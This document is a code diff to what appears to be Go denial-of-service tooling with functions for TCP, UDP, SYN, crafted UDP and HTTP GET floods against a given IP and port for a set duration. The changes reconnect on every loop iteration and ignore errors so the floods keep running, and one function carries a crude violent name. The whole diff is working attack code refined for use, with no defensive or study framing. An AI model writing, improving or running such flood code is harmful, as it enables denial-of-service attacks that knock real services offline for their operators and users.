@@ -27,35 +27,28 @@ func generate_random_string(length int) string {
 
 // tcp flood
 func TCP(ip string, port int, dur int) {
-	tcp_socket, err := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
-	if err != nil {
-		return
-	}
 	end := time.Now().Add(time.Duration(dur) * time.Second)
 	for time.Now().Before(end) {
+		tcp_socket, _ := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
 		_, err := tcp_socket.Write([]byte(generate_random_string(1000)))
 		if err != nil {
-			break
+			fmt.Println(err)
 		}
+		tcp_socket.Close()
 	}
-	tcp_socket.Close()
 }
 
 // udp flood
 func UDP(ip string, port int, dur int) {
-	udp_socket, err := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
-	if err != nil {
-		return
-	}
-
 	end := time.Now().Add(time.Duration(dur) * time.Second)
 	for time.Now().Before(end) {
+		udp_socket, _ := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
 		_, err := udp_socket.Write([]byte(generate_random_string(1000)))
 		if err != nil {
-			break
+			fmt.Println(err)
 		}
+		udp_socket.Close()
 	}
-	udp_socket.Close()
 }
 
 // syn flood
@@ -70,29 +63,22 @@ func SYN(ip string, port int, dur int) {
 	}
 }
 
-// dns flood
+// CRAFTED UPD flood
 func UDPRAPE(ip string, port int, dur int) {
 	packetSize := 1000
-
-	conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
-	if err != nil {
-		return
-	}
-	defer conn.Close()
 
 	packetData := strings.Repeat("\xfe", packetSize)
 	end := time.Now().Add(time.Duration(dur) * time.Second)
 	for time.Now().Before(end) {
+		conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
 		conn.Write([]byte(packetData))
 		conn.Write(udprapepacket)
 		conn.Write(udprapecraftedpacket2)
-		if err != nil {
-			break
-		}
+		conn.Close()
 	}
 }
 
-// http flood
+// http Get flood
 func HTTP(target string, dur int) {
 	start_time := time.Now()
 	timeout := start_time.Add(time.Duration(dur) * time.Second)
